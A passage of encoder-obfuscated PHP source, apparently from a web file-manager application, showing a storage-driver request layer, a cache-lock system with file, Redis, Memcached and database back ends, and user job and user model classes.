$ÆÆß®îÖ; } $úàºÈ¯” = $this->request($ñµ—[1605], array($Ò•ƒÖ«, $Ó•ÖµÑ¼)); $‡»âØËõ[$Ò•ƒÖ«] = $úàºÈ¯”; return $úàºÈ¯”; } private function _fileSubstr($àÜ„ä‡, $§—ğŒÒ‰ = 0, $œ×å§Û„ = -1) { $ú¡„òïÓ =& $_SERVER[ïÃ°£«Ê]; $šÉÑ’ô† = $this->_fileLink($àÜ„ä‡); if (!$šÉÑ’ô†) { return !1; } $œê¾´ô¦ = !1; if ($œ×å§Û„ > 0) { $áïõû¥Õ = $„ä›Î×‡ + $œ×å§Û„ - 1; $œê¾´ô¦ = array($ú¡„òïÓ[1606] . $„ä›Î×‡ . $ú¡„òïÓ[476] . $áïõû¥Õ); } $ñõîÏ³º = url_request($šÉÑ’ô†, $ú¡„òïÓ[1607], !1, $œê¾´ô¦); return $ñõîÏ³º[$ú¡„òïÓ[851]] ? $ñõîÏ³º[$ú¡„òïÓ[1394]] : !1; } private function _download($üª÷šªÕ, $Í¶«‘˜Ë) { $ ô‡¯Ğ× = $this->_fileLink($üª÷šªÕ); if (!$ ô‡¯Ğ×) { return !1; } Downloader::start($ ô‡¯Ğ×, $Í¶«‘˜Ë); return $Í¶«‘˜Ë; } private function _fileLink($ÛŞÈ·£÷, $ÂÆ³ì·Õ = '') { $ù˜µùÍ¤ =& $_SERVER[ïÃ°£«Ê]; $û·µ è“ = $this->pathApiEncode($ÛŞÈ·£÷); return $this->requestMakeUrl($ù˜µùÍ¤[1608], array($ù˜µùÍ¤[87] => $û·µ è“)) . $ÂÆ³ì·Õ; } private function urlAuto($æ“õÄ¯) { $Ò¦Ğıªµ =& $_SERVER[ïÃ°£«Ê]; if (!$æ“õÄ¯) { return $æ“õÄ¯; } $ş¨Äªã = parse_url($æ“õÄ¯); $ÖÕ³ª¤‡ = $æ“õÄ¯; if ($this->_config[$Ò¦Ğıªµ[1558]] && $ş¨Äªã[$Ò¦Ğıªµ[205]] == $Ò¦Ğıªµ[149] && Input::check($ş¨Äªã[$Ò¦Ğıªµ[1609]], $Ò¦Ğıªµ[1610])) { $æ“õÄ¯ = $Ò¦Ğıªµ[217] . substr($æ“õÄ¯, 7); } $É±¯ºÚ = $Ò¦Ğıªµ[1611] . rawurlencode(rtrim($this->config[$Ò¦Ğıªµ[1555]], $Ò¦Ğıªµ[8])); if (strstr($æ“õÄ¯, $É±¯ºÚ)) { $ç£ëÏ…× = strstr($æ“õÄ¯, $Ò¦Ğıªµ[76]) ? $Ò¦Ğıªµ[284] : $Ò¦Ğıªµ[76]; $æ“õÄ¯ = $æ“õÄ¯ . $ç£ëÏ…× . $Ò¦Ğıªµ[1612] . $this->authToken; } return $æ“õÄ¯; } private function request($­Şù›œ, $¸˜—å§) { $İ¤İæ²„ =& $_SERVER[ïÃ°£«Ê]; if (!is_array($¸˜—å§)) { $¸˜—å§ = array(); } for ($·û ø¼ = 0; $·û ø¼ < 4; $·û ø¼++) { if (!isset($¸˜—å§[$·û ø¼])) { $¸˜—å§[$·û ø¼] = $İ¤İæ²„[12]; } } $ˆñËµÊƒ = array($İ¤İæ²„[1605] => array($İ¤İæ²„[1613] => $İ¤İæ²„[1605], $İ¤İæ²„[1614] => $İ¤İæ²„[1615], $İ¤İæ²„[1616] => $İ¤İæ²„[87], $İ¤İæ²„[1358] => array($İ¤İæ²„[1617] => array(array($İ¤İæ²„[87] => $¸˜—å§[0])), $İ¤İæ²„[1618] => $¸˜—å§[1] ? $İ¤İæ²„[91] : $İ¤İæ²„[12])), $İ¤İæ²„[1567] => array($İ¤İæ²„[1613] => $İ¤İæ²„[1619], $İ¤İæ²„[1614] => $İ¤İæ²„[87], $İ¤İæ²„[1616] => $İ¤İæ²„[1620], $İ¤İæ²„[1358] => array($İ¤İæ²„[87] => $¸˜—å§[0], $İ¤İæ²„[428] => _get($GLOBALS[$İ¤İæ²„[7]], $İ¤İæ²„[428], $İ¤İæ²„[91]), $İ¤İæ²„[439] => _get($GLOBALS[$İ¤İæ²„[7]], $İ¤İæ²„[439], $İ¤İæ²„[1621]))), $İ¤İæ²„[1622] => array($İ¤İæ²„[1613] => $İ¤İæ²„[1623], $İ¤İæ²„[1614] => $İ¤İæ²„[87], $İ¤İæ²„[1616] => $İ¤İæ²„[1624], $İ¤İæ²„[1358] => array($İ¤İæ²„[87] => $¸˜—å§[0])), $İ¤İæ²„[1568] => array($İ¤İæ²„[1613] => $İ¤İæ²„[1625], $İ¤İæ²„[1614] => $İ¤İæ²„[87], $İ¤İæ²„[1626] => $İ¤İæ²„[1627], $İ¤İæ²„[1358] => array($İ¤İæ²„[87] => $¸˜—å§[0], $İ¤İæ²„[168] => $¸˜—å§[1])), $İ¤İæ²„[1544] => array($İ¤İæ²„[1613] => $İ¤İæ²„[1544], $İ¤İæ²„[1614] => $İ¤İæ²„[87], $İ¤İæ²„[1626] => $İ¤İæ²„[595], $İ¤İæ²„[1358] => array($İ¤İæ²„[87] => $¸˜—å§[0], $İ¤İæ²„[168] => $¸˜—å§[1], $İ¤İæ²„[1582] => $¸˜—å§[2])), $İ¤İæ²„[1545] => array($İ¤İæ²„[1613] => $İ¤İæ²„[1545], $İ¤İæ²„[1614] => $İ¤İæ²„[87], $İ¤İæ²„[1626] => $İ¤İæ²„[595], $İ¤İæ²„[1358] => array($İ¤İæ²„[87] => $¸˜—å§[0], $İ¤İæ²„[1582] => $¸˜—å§[2])), $İ¤İæ²„[641] => array($İ¤İæ²„[1613] => $İ¤İæ²„[1628], $İ¤İæ²„[1614] => $İ¤İæ²„[1629], $İ¤İæ²„[1626] => $İ¤İæ²„[1630], $İ¤İæ²„[1358] => array($İ¤İæ²„[1617] => array(array($İ¤İæ²„[87] => $¸˜—å§[0])), $İ¤İæ²„[87] => $¸˜—å§[1], $İ¤İæ²„[1582] => $¸˜—å§[2])), $İ¤İæ²„[643] => array($İ¤İæ²„[1613] => $İ¤İæ²„[1631], $İ¤İæ²„[1614] => $İ¤İæ²„[1629], $İ¤İæ²„[1626] => $İ¤İæ²„[1630], $İ¤İæ²„[1358] => array($İ¤İæ²„[1617] => array(array($İ¤İæ²„[87] => $¸˜—å§[0])), $İ¤İæ²„[87] => $¸˜—å§[1], $İ¤İæ²„[1582] => $¸˜—å§[2])), $İ¤İæ²„[1336] => array($İ¤İæ²„[1613] => $İ¤İæ²„[1632], $İ¤İæ²„[1614] => $İ¤İæ²„[1615], $İ¤İæ²„[1616] => $İ¤İæ²„[87], $İ¤İæ²„[1358] => array($İ¤İæ²„[1617] => array(array($İ¤İæ²„[87] => $¸˜—å§[0])))), $İ¤İæ²„[1548] => array($İ¤İæ²„[1613] => $İ¤İæ²„[1633], $İ¤İæ²„[1614] => $İ¤İæ²„[87], $İ¤İæ²„[1626] => $İ¤İæ²„[595], $İ¤İæ²„[1358] => array($İ¤İæ²„[87] => $¸˜—å§[0], $İ¤İæ²„[1634] => $¸˜—å§[1])), $İ¤İæ²„[107] => array($İ¤İæ²„[1613] => $İ¤İæ²„[1572], $İ¤İæ²„[1614] => $İ¤İæ²„[87], $İ¤İæ²„[1626] => $İ¤İæ²„[595], $İ¤İæ²„[1358] => array($İ¤İæ²„[87] => get_path_father($¸˜—å§[0]), $İ¤İæ²„[230] => $¸˜—å§[1] ? $İ¤İæ²„[1400] . $¸˜—å§[1] : $İ¤İæ²„[12], $İ¤İæ²„[32] => get_path_this($¸˜—å§[0]), $İ¤İæ²„[1582] => $¸˜—å§[2]))); $²„—È– = $ˆñËµÊƒ[$­Şù›œ]; if (!$²„—È–) { return !1; } $›ÛİóÁĞ = $²„—È–[$İ¤İæ²„[1358]]; $ŠÃ‰‚àá = explode($İ¤İæ²„[50], $²„—È–[$İ¤İæ²„[1614]]); foreach ($ŠÃ‰‚àá as $ë»öÜ±ü) { $æò“×öö = $this->pathApiEncode(_get($›ÛİóÁĞ, $ë»öÜ±ü)); array_set_value($›ÛİóÁĞ, $ë»öÜ±ü, $æò“×öö); } if ($­Şù›œ == $İ¤İæ²„[1548] && trim($²„—È–[$İ¤İæ²„[1358]][$İ¤İæ²„[87]], $İ¤İæ²„[8]) == trim($this->_config[$İ¤İæ²„[1359]], $İ¤İæ²„[8])) { return $²„—È–[$İ¤İæ²„[1358]][$İ¤İæ²„[87]]; } $ë«ÄŠøš = $this->requestSend($²„—È–[$İ¤İæ²„[1613]], $›ÛİóÁĞ); if (!$ë«ÄŠøš) { return !1; } $¤ÇÅĞı = $ë«ÄŠøš[$İ¤İæ²„[1394]]; if ($²„—È–[$İ¤İæ²„[1626]]) { $¤ÇÅĞı = _get($ë«ÄŠøš, $²„—È–[$İ¤İæ²„[1626]]); } if (is_string($¤ÇÅĞı) && !$²„—È–[$İ¤İæ²„[1616]]) { return $this->pathApiDecode($¤ÇÅĞı); } if (!is_array($¤ÇÅĞı) || !$¤ÇÅĞı) { return $¤ÇÅĞı; } $Œ»ÏïÓ× = explode($İ¤İæ²„[50], $²„—È–[$İ¤İæ²„[1616]]); foreach ($Œ»ÏïÓ× as $ë»öÜ±ü) { $—ë“Ğ±´ = explode($İ¤İæ²„[10], $ë»öÜ±ü); $ê‹€¾‹Ê = array_search($İ¤İæ²„[1635], $—ë“Ğ±´); if ($ê‹€¾‹Ê === !1) { $æò“×öö = $this->pathApiDecode(_get($¤ÇÅĞı, $ë»öÜ±ü)); array_set_value($¤ÇÅĞı, $ë»öÜ±ü, $æò“×öö); if ($­Şù›œ == $İ¤İæ²„[1605] && $ë»öÜ±ü == $İ¤İæ²„[87]) { $this->pathInfoParse($¤ÇÅĞı); } if ($­Şù›œ == $İ¤İæ²„[1567] && $ë»öÜ±ü == $İ¤İæ²„[1636]) { $this->pathInfoParse($¤ÇÅĞı[$İ¤İæ²„[968]]); } if ($­Şù›œ == $İ¤İæ²„[1567]) { $¤ÇÅĞı[$İ¤İæ²„[1637]] = array(); } continue; } $ı¯…³œÏ = implode($İ¤İæ²„[10], array_slice($—ë“Ğ±´, $ê‹€¾‹Ê + 1)); $ºàŒâèŒ = array(); if ($ê‹€¾‹Ê === 0) { $ºàŒâèŒ =& $¤ÇÅĞı; } if ($ê‹€¾‹Ê === 1) { $ºàŒâèŒ =& $¤ÇÅĞı[$—ë“Ğ±´[0]]; } if ($ê‹€¾‹Ê === 2) { $ºàŒâèŒ =& $¤ÇÅĞı[$—ë“Ğ±´[0]][$—ë“Ğ±´[1]]; } foreach ($ºàŒâèŒ as $ë»öÜ±ü => $½ÇÖ¸•Ï) { $æò“×öö = $this->pathApiDecode(_get($½ÇÖ¸•Ï, $ı¯…³œÏ)); array_set_value($ºàŒâèŒ[$ë»öÜ±ü], $ı¯…³œÏ, $æò“×öö); $this->pathInfoParse($ºàŒâèŒ[$ë»öÜ±ü]); } unset($ºàŒâèŒ); } return $¤ÇÅĞı; } private function requestMakeUrl($‚äºöÒ, $Î™Óƒôä = '') { $Å—ª¡“ =& $_SERVER[ïÃ°£«Ê]; $µ¨½ÓìÓ = $this->_config; if (!$this->authToken) { return !1; } $ˆ¯¿Íê§ = $this->requestQuery($Î™Óƒôä, !0) . $Å—ª¡“[1638] . $this->authToken; $£ó‹¯Öî = rtrim($µ¨½ÓìÓ[$Å—ª¡“[580]][$Å—ª¡“[1584]], $Å—ª¡“[8]) . $Å—ª¡“[1639] . $‚äºöÒ; return $£ó‹¯Öî . $Å—ª¡“[1640] . rawurlencode($µ¨½ÓìÓ[$Å—ª¡“[580]][$Å—ª¡“[1556]]) . $ˆ¯¿Íê§; } private function requestAuthToken() { $ÇŞë¾Õ¿ =& $_SERVER[ïÃ°£«Ê]; $ˆÌ×Û = $this->_config; if (!$ˆÌ×Û) { return !1; } $áê«®š¾ = _get($ˆÌ×Û, $ÇŞë¾Õ¿[1641]); $ óİÆ½ = array_find_by_field($ˆÌ×Û[$ÇŞë¾Õ¿[580]][$ÇŞë¾Õ¿[1596]], $ÇŞë¾Õ¿[1642], $áê«®š¾); if (!$ óİÆ½) { return !1; } $Ë—Ñ– = $ óİÆ½[$ÇŞë¾Õ¿[1643]] . $ÇŞë¾Õ¿[1644] . $ óİÆ½[$ÇŞë¾Õ¿[1349]]; $±š§ö¢ú = $ÇŞë¾Õ¿[1645] . $this->pathParse[$ÇŞë¾Õ¿[487]] . $ÇŞë¾Õ¿[476] . $Ë—Ñ–; $×Ú¬îå° = Cache::get($±š§ö¢ú); if ($×Ú¬îå°) { return $×Ú¬îå°; } $×Ú¬îå° = Mcrypt::encode($Ë—Ñ–, $ÇŞë¾Õ¿[1646]); Cache::set($±š§ö¢ú, $×Ú¬îå°, 3600 * 24 * 60); return $×Ú¬îå°; } private function requestQuery($§ı„Ùº = '', $Ğ€ØÆ’Œ = false) { if (!$§ı„Ùº || !is_array($§ı„Ùº)) { return $§ı„Ùº; } foreach ($§ı„Ùº as $†œ…áœä => $®šÈì÷‰) { if (is_array($®šÈì÷‰)) { $§ı„Ùº[$†œ…áœä] = json_encode($®šÈì÷‰); } } return $Ğ€ØÆ’Œ ? $_SERVER[ïÃ°£«Ê][284] . http_build_query($§ı„Ùº) : $§ı„Ùº; } private function requestSend($’»úòäá, $‰÷şíÁ×) { $·€®ñ¹ =& $_SERVER[ïÃ°£«Ê]; $ÚŠû®¹« = $this->requestMakeUrl($’»úòäá); if (!$ÚŠû®¹«) { return !1; } $Á×ŠÛÇ = url_request($ÚŠû®¹«, $·€®ñ¹[288], $this->requestQuery($‰÷şíÁ×), !1, !1, !0); $Ç÷®‘â = $Á×ŠÛÇ[$·€®ñ¹[1394]]; if (!is_array($Ç÷®‘â) || !$Ç÷®‘â || !$Ç÷®‘â[$·€®ñ¹[1404]] || intval($Ç÷®‘â[$·€®ñ¹[1404]]) > 500) { $ñ›º¶êè = is_array($Ç÷®‘â) ? $Ç÷®‘â[$·€®ñ¹[1394]] : $Ç÷®‘â . $·€®ñ¹[12]; if (!$Á×ŠÛÇ[$·€®ñ¹[851]]) { $ñ›º¶êè .= $·€®ñ¹[1647] . $Á×ŠÛÇ[$·€®ñ¹[1404]] . $·€®ñ¹[175]; } IO::errorTips($ñ›º¶êè, !1); return !1; } return $Ç÷®‘â; } } class PathDriverEDS extends PathDriverBaseS3 { public function __construct($ ôÍî¦¿) { parent::__construct($ ôÍî¦¿); $this->setSignVersion($_SERVER[ïÃ°£«Ê][247]); } } goto B²³§ˆæÍ; cİŒª½ƒáÁ: class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $œ‹ÜèĞ =& $_SERVER[ïÃ°£«Ê]; if (self::$handle) { return self::$handle; } $ÇúŠ¹ = $GLOBALS[$œ‹ÜèĞ[6]][$œ‹ÜèĞ[424]]; self::$timeout = $ÇúŠ¹[$œ‹ÜèĞ[998]] ? $ÇúŠ¹[$œ‹ÜèĞ[998]] : 10; $µô½Ïçò = _get($GLOBALS[$œ‹ÜèĞ[6]], $œ‹ÜèĞ[999]); $’ß‘˜›¿ = $ÇúŠ¹[$œ‹ÜèĞ[981]] ? $ÇúŠ¹[$œ‹ÜèĞ[981]] : $œ‹ÜèĞ[230]; if ($’ß‘˜›¿ == $œ‹ÜèĞ[21] && $µô½Ïçò == $œ‹ÜèĞ[13]) { $’ß‘˜›¿ = $œ‹ÜèĞ[230]; } switch ($’ß‘˜›¿) { case $œ‹ÜèĞ[984]: self::$handle = new CacheLockRedis(); break; case $œ‹ÜèĞ[985]: self::$handle = new CacheLockMemcached(); break; case $œ‹ÜèĞ[21]: self::$handle = new CacheLockDatabase(); break; case $œ‹ÜèĞ[230]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($œ‹ÜèĞ[1000], $œ‹ÜèĞ[1001]); } return self::$handle; } private static function key($Ë‘ƒÄÙ) { return $_SERVER[ïÃ°£«Ê][1002] . Cache::key($Ë‘ƒÄÙ); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($íÕ¢§³ = '') { self::$errorMsg = $íÕ¢§³; } public static function lockGlobal($ÒíĞïı°, $ùÙÍÖÄ€) { return self::lock($ÒíĞïı°, $ùÙÍÖÄ€, !0); } public static function lock($‡Ó½Ù¾à, $Ö†À¾ç = false, $âï€×¿ = false) { $¨ØŸÕ¹“ =& $_SERVER[ïÃ°£«Ê]; $¶áóğîÌ = self::init(); $¶„×ôçâ = self::key($‡Ó½Ù¾à); $Ö†À¾ç = $Ö†À¾ç ? $Ö†À¾ç : self::$timeout; $ï¯÷û„Ù = timeFloat(); if (_get($GLOBALS, $¨ØŸÕ¹“[1003], !1)) { if (!$¶áóğîÌ->lock($¶„×ôçâ, 0.2)) { die; } return !0; } $÷«âùûõ = $¶áóğîÌ->lock($¶„×ôçâ, $Ö†À¾ç); $»¥Å«Ò— = timeFloat(); if (!$÷«âùûõ) { $¯ëêÆ¾ˆ = "\154\x6f\x63\153\x20\145\162\x72\x6f\x72\73\x6b\x65\x79\75{$‡Ó½Ù¾à}\x3b\x74\x69\155\x65\75{$Ö†À¾ç}\x3b" . self::$errorMsg . $¨ØŸÕ¹“[74] . get_caller_msg(); $ÁóØ’ÆÑ = LNG($¨ØŸÕ¹“[1004]) . "\50{$Ö†À¾ç}\163\51\x2e" . LNG($¨ØŸÕ¹“[1005]); $ÁóØ’ÆÑ .= $¨ØŸÕ¹“[1006]; if (is_string(self::$errorMsg) && self::$errorMsg) { $ÁóØ’ÆÑ = $ÁóØ’ÆÑ . $¨ØŸÕ¹“[1007] . self::$errorMsg; } write_log($¨ØŸÕ¹“[1008] . sprintf($¨ØŸÕ¹“[1009], timeFloat() - $ï¯÷û„Ù) . $¨ØŸÕ¹“[1010] . $¯ëêÆ¾ˆ . $¨ØŸÕ¹“[1011] . json_encode(error_get_last()), $¨ØŸÕ¹“[1001]); show_json($ÁóØ’ÆÑ, !1); } if (!$âï€×¿) { self::$lockItem[$¶„×ôçâ] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $Ñşœ’âÂ = number_format(timeFloat() - $»¥Å«Ò—, 3); write_log($¨ØŸÕ¹“[1012] . $‡Ó½Ù¾à . $¨ØŸÕ¹“[1013] . $Ñşœ’âÂ, $¨ØŸÕ¹“[1001]); } return $÷«âùûõ; } public static function lockGet($ûÄó‹ Ô) { $áˆ´ÙÁ = self::key($ûÄó‹ Ô); if (self::$lockItem[$áˆ´ÙÁ]) { return self::$lockItem[$áˆ´ÙÁ]; } return self::init()->lockGet($áˆ´ÙÁ); } public static function unlock($…•óáéƒ) { $¤ ÓşÔ— =& $_SERVER[ïÃ°£«Ê]; $€ù æ«Ä = self::key($…•óáéƒ); self::$lockItem[$€ù æ«Ä] = null; self::init()->unlock($€ù æ«Ä); if (GLOBAL_DEBUG_LOG_ALL) { write_log($¤ ÓşÔ—[1014] . $…•óáéƒ, $¤ ÓşÔ—[1001]); } return; } public static function unlockRuntime() { $î‘ÕÀÉ =& $_SERVER[ïÃ°£«Ê]; $Ï…ÙÕ¢ = self::init(); $Ö¥†É¶â = !1; foreach (self::$lockItem as $äôûïªà => $ùÇòÑğÃ) { if (!$ùÇòÑğÃ) { continue; } $Ï…ÙÕ¢->unlock($äôûïªà); if (!$Ö¥†É¶â) { $Ö¥†É¶â = !0; write_log($î‘ÕÀÉ[1015] . $äôûïªà . $î‘ÕÀÉ[74] . get_caller_msg(), $î‘ÕÀÉ[1001]); continue; } write_log($î‘ÕÀÉ[1015] . $äôûïªà, $î‘ÕÀÉ[1001]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $§ìà‚€ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($î‘ÕÀÉ[1016] . $§ìà‚€ . $î‘ÕÀÉ[1017] . ACTION, $î‘ÕÀÉ[1001]); } } public static function fileLock($áÁ»ü’) { $¢û Úâ =& $_SERVER[ïÃ°£«Ê]; if (!$GLOBALS[$¢û Úâ[1018]]) { $GLOBALS[$¢û Úâ[1018]] = array(); } $GLOBALS[$¢û Úâ[1018]][$áÁ»ü’] = !1; $Ú‚‹İ½ = fopen(DATA_PATH . $áÁ»ü’ . $¢û Úâ[1019], $¢û Úâ[1020]); if (!$Ú‚‹İ½) { return !1; } $GLOBALS[$¢û Úâ[1018]][$áÁ»ü’] = $Ú‚‹İ½; if (flock($Ú‚‹İ½, LOCK_EX)) { return !0; } self::unlock($áÁ»ü’); show_json($¢û Úâ[1021], !1); return !1; } public static function fileUnlock($™ÙÍ–€ë) { $‚›èÙú… =& $_SERVER[ïÃ°£«Ê]; $øÏ¦êî = $GLOBALS[$‚›èÙú…[1018]][$™ÙÍ–€ë]; if (!$øÏ¦êî) { return; } $GLOBALS[$‚›èÙú…[1018]][$™ÙÍ–€ë] = !1; flock($øÏ¦êî, LOCK_UN); fclose($øÏ¦êî); } public static function fileUnlockAll() { $Ÿ«ã¾¬£ =& $_SERVER[ïÃ°£«Ê]; if (!isset($GLOBALS[$Ÿ«ã¾¬£[1018]]) || !$GLOBALS[$Ÿ«ã¾¬£[1018]]) { return; } foreach ($GLOBALS[$Ÿ«ã¾¬£[1018]] as $Ÿ†Ä³ùÉ => $­í×ˆÇı) { if (!$­í×ˆÇı) { continue; } $GLOBALS[$Ÿ«ã¾¬£[1018]][$Ÿ†Ä³ùÉ] = !1; flock($­í×ˆÇı, LOCK_UN); fclose($­í×ˆÇı); } $GLOBALS[$Ÿ«ã¾¬£[1018]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $Åö‚•ßã =& $_SERVER[ïÃ°£«Ê]; $ÊöäÍ—³ = $GLOBALS[$Åö‚•ßã[6]][$Åö‚•ßã[424]]; self::$cachePath = $ÊöäÍ—³[$Åö‚•ßã[230]][$Åö‚•ßã[87]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($¼Ûô, $êé£èÌÊ = 0) { $®Î‹á =& $_SERVER[ïÃ°£«Ê]; $“•ÙÄŒ’ = microtime(!0); $¦“óé Â = $“•ÙÄŒ’ + $êé£èÌÊ + 0.0001; $¦õ€æ˜‹ = rtrim(self::$cachePath, $®Î‹á[8]) . $®Î‹á[1022] . md5($¼Ûô) . $®Î‹á[1019]; if (file_exists($¦õ€æ˜‹) && filemtime($¦õ€æ˜‹) && filemtime($¦õ€æ˜‹) < time() - 10) { @unlink($¦õ€æ˜‹); } do { if (file_exists($¦õ€æ˜‹)) { cacheLockWait(); continue; } $Ïãó—Ç¡ = fopen($¦õ€æ˜‹, $®Î‹á[1023]); if (!$Ïãó—Ç¡) { return !1; } $ñ‘§üÌÛ = flock($Ïãó—Ç¡, LOCK_EX | LOCK_NB); self::$caches[$¼Ûô] = array($®Î‹á[1024] => $Ïãó—Ç¡, $®Î‹á[230] => $¦õ€æ˜‹); fwrite($Ïãó—Ç¡, $¦“óé Â); clearstatcache(); if ($Ïãó—Ç¡ && $ñ‘§üÌÛ) { return !0; } cacheLockWait(); } while (microtime(!0) < $¦“óé Â); $this->unlock($¼Ûô); return !1; } public function lockGet($ Ş´ ª) { $Æ”Òéç¬ =& $_SERVER[ïÃ°£«Ê]; $êç¼ø² = rtrim(self::$cachePath, $Æ”Òéç¬[8]) . $Æ”Òéç¬[1022] . md5($ Ş´ ª) . $Æ”Òéç¬[1019]; return file_exists($êç¼ø²); } public function unlock($ŠóÁ¦¡) { $Î²íÑ ® =& $_SERVER[ïÃ°£«Ê]; $õ®§øš = self::$caches[$ŠóÁ¦¡]; if (!$õ®§øš) { return; } @flock($õ®§øš[$Î²íÑ ®[1024]], LOCK_UN); @fclose($õ®§øš[$Î²íÑ ®[1024]]); @unlink($õ®§øš[$Î²íÑ ®[230]]); unset(self::$caches[$ŠóÁ¦¡]); } } goto a¹£ÚŸõ°ä; Eµã©¼ßÂ: class UserJobModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\x65\155\x2e\x6a\157\x62\x4c\151\163\x74"; public $field = array("\156\x61\x6d\x65", "\x64\x65\x73\x63", "\x73\157\x72\164"); const JOB_KEY = "\x73\x65\x6c\x66\112\x6f\x62\114\151\163\164"; public function listData($“ØËŞà€ = false, $®ŠªÈ¥ = "\163\157\162\x74", $–Øšà®í = false) { return parent::listData($“ØËŞà€, $®ŠªÈ¥, $–Øšà®í); } public function remove($—ÃŒ‹Ôñ) { return parent::remove($—ÃŒ‹Ôñ); } public function add($µÑİ¡í) { $¾èçè«™ =& $_SERVER[ïÃ°£«Ê]; if ($this->findByName($µÑİ¡í[$¾èçè«™[32]])) { return !1; } $µÑİ¡í[$¾èçè«™[2207]] = $this->getSort(); return parent::insert($µÑİ¡í); } private function getSort() { $â­ÚâÇµ =& $_SERVER[ïÃ°£«Ê]; $Ç­Œ­ëÍ = parent::listData(); $…îîá»à = array_to_keyvalue($Ç­Œ­ëÍ, $â­ÚâÇµ[12], $â­ÚâÇµ[2207]); return empty($…îîá»à) ? 0 : max($…îîá»à) + 1; } public function update($´æ„Ú, $µùğÍ»ê) { $ò‹ÅÇùµ =& $_SERVER[ïÃ°£«Ê]; $€ç…ô— = parent::listData($´æ„Ú); $çİ»·ˆé = $this->findByName($µùğÍ»ê[$ò‹ÅÇùµ[32]]); if (!$€ç…ô— || $çİ»·ˆé && $çİ»·ˆé[$ò‹ÅÇùµ[487]] != $€ç…ô—[$ò‹ÅÇùµ[487]]) { return !1; } return parent::update($´æ„Ú, $µùğÍ»ê); } public function setUserJob($íÆ»İ¸„, $ş‡Ù±ˆé) { $ÎıÑÓ‚à =& $_SERVER[ïÃ°£«Ê]; if (!is_array($ş‡Ù±ˆé)) { $ş‡Ù±ˆé = array($ş‡Ù±ˆé); } $¶Ê®ˆŞß = parent::listData(); $ºÅâÍ‹× = array_to_keyvalue($¶Ê®ˆŞß, $ÎıÑÓ‚à[32]); $·úÉ†€” = $ÎıÑÓ‚à[463]; foreach ($ş‡Ù±ˆé as $üÚÔ¾È) { if ($ºÅâÍ‹×[$üÚÔ¾È]) { $·úÉ†€” .= $ºÅâÍ‹×[$üÚÔ¾È][$ÎıÑÓ‚à[487]] . $ÎıÑÓ‚à[50]; } else { $ÌºƒØ’ı = $this->add($üÚÔ¾È); $·úÉ†€” .= $ÌºƒØ’ı . $ÎıÑÓ‚à[50]; } } $·úÉ†€” = rtrim($·úÉ†€”, $ÎıÑÓ‚à[50]); Model($ÎıÑÓ‚à[617])->metaSet($íÆ»İ¸„, self::JOB_KEY, $·úÉ†€”); } public function getUserJob($ıÏ„«”í) { $Û³ÅÉÑ = Model($_SERVER[ïÃ°£«Ê][617])->metaGet($ıÏ„«”í); return $this->getUserJobInfo($Û³ÅÉÑ[self::JOB_KEY]); } public function getUserJobInfo($§Ôø¶›Ù) { $Ø¤¯Ï©ä =& $_SERVER[ïÃ°£«Ê]; $ı µ²­¶ = explode($Ø¤¯Ï©ä[50], $§Ôø¶›Ù); $‰ĞôÆÄĞ = parent::listData(); $‰ĞôÆÄĞ = array_remove_key($‰ĞôÆÄĞ, $Ø¤¯Ï©ä[231]); $éĞÄù£Ô = array(); foreach ($ı µ²­¶ as $ßÅŠ²¶È) { if (isset($‰ĞôÆÄĞ[$ßÅŠ²¶È])) { $éĞÄù£Ô[] = $‰ĞôÆÄĞ[$ßÅŠ²¶È]; } } return $éĞÄù£Ô; } } class UserModel extends ModelBase { protected $tableName = "\165\163\145\x72"; protected $tableMeta = array("\x74\141\142\x6c\145\x4e\x61\155\x65" => "\165\x73\145\162\137\x6d\145\x74\x61", "\155\145\x74\141\x46\151\x65\x6c\x64" => "\165\163\145\162\111\104"); protected $simpleField = "\165\163\x65\x72\111\104\x2c\156\151\143\153\x4e\x61\x6d\x65\54\x6e\141\x6d\x65\54\141\x76\141\164\141\162\54\x73\145\x78\x2c\163\164\x61\x74\x75\163"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($¥ü¦şîğ) { $‚ùöó¶Ö =& $_SERVER[ïÃ°£«Ê]; $³“äÁœ  = $‚ùöó¶Ö[2675]; return array($‚ùöó¶Ö[2266] => array($¥ü¦şîğ[0], $³“äÁœ ), $‚ùöó¶Ö[2268] => array($¥ü¦şîğ[0], $³“äÁœ ), $‚ùöó¶Ö[2676] => array($¥ü¦şîğ[0], $³“äÁœ )); } protected function ___getInfo($ëÛ¾••ä) { $¾¯ù¥“¤ = $this->getInfoSimple($ëÛ¾••ä); if (!$¾¯ù¥“¤ || !is_array($¾¯ù¥“¤)) { return array(); } return $this->_getInfoApply($¾¯ù¥“¤); } protected function ___getInfoFull($éé½è´¨) { $İ¸’§±Á = $this->getInfoSimple($éé½è´¨); if (!$İ¸’§±Á || !is_array($İ¸’§±Á)) { return array(); } return $this->_getInfoApply($İ¸’§±Á, !0); } protected function ___getInfoSimple($§¯’«ı„) { $¿†¹¨äú =& $_SERVER[ïÃ°£«Ê]; if (!$§¯’«ı„) { return array(); } $ìÙĞ¥ê = $this->where(array($¿†¹¨äú[1594] => intval($§¯’«ı„)))->find(); if (!$ìÙĞ¥ê || !is_array($ìÙĞ¥ê)) { return array(); } $ìÙĞ¥ê[$¿†¹¨äú[2377]] = Action($¿†¹¨äú[2378])->parseUrl($ìÙĞ¥ê[$¿†¹¨äú[2377]]); return $ìÙĞ¥ê; } private function _getInfoApply($®ÅÕ¢‘á, $úÓªÎ  = false) { $©Ş„¤Û =& $_SERVER[ïÃ°£«Ê]; if (!$®ÅÕ¢‘á) { return $®ÅÕ¢‘á; 